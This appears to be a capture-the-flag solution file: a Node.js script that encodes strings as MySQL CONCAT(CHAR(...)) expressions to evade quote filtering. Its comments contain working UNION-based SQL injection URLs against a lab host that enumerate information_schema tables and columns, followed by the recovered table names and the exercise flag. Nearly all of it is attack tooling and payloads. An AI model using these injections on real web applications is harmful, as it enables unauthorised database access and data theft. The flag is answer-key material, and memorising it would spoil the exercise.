function string_to_ascii(db) {
    let num = db.length
    let up = 0
    let stringAscii = ""

    while (num > up) {        
        stringAscii += `CHAR(${db.charCodeAt(up)}), `
        ++up
    }
    // console.log(stringAscii.slice(0, -1))
    console.log("CONCAT(" + stringAscii.slice(0,-2) + ")")
}

let db = process.argv[2];

const charAscii = string_to_ascii(db)

// function string_to_ascii(db) {
//     let num = db.length
//     let up = 0
//     let stringAscii = ""

//     while (num > up) {        
//         stringAscii += `${db.charCodeAt(up)} + `
//         ++up
//     }
//     // console.log(stringAscii.slice(0, -1))
//     console.log("CHAR(" + stringAscii.slice(0,-3) + ")")
// }

// let db = "Member_Brute_Force";

// const charAscii = string_to_ascii(db)

// http://192.168.1.34/index.php?page=member&id=1%20union%20select%20column_name,0%20from%20information_schema.columns%20where%20table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(66), CHAR(114), CHAR(117), CHAR(116), CHAR(101), CHAR(95), CHAR(70), CHAR(111), CHAR(114), CHAR(99), CHAR(101))&Submit=Submit

// http://192.168.1.34/index.php?page=member&id=1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=CONCAT(CHAR(77), CHAR(101), CHAR(109), CHAR(98), CHAR(101), CHAR(114), CHAR(95), CHAR(66), CHAR(114), CHAR(117), CHAR(116), CHAR(101), CHAR(95), CHAR(70), CHAR(111), CHAR(114), CHAR(99), CHAR(101))&Submit=Submit

// http://192.168.1.34/index.php?page=member&id=1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=1 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME=CONCAT(CHAR(100), CHAR(98), CHAR(95), CHAR(100), CHAR(101), CHAR(102), CHAR(97), CHAR(117), CHAR(108), CHAR(116))--&Submit=Submit



// table names: db_default
// admin shadow

// THE FLAG IS : B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2
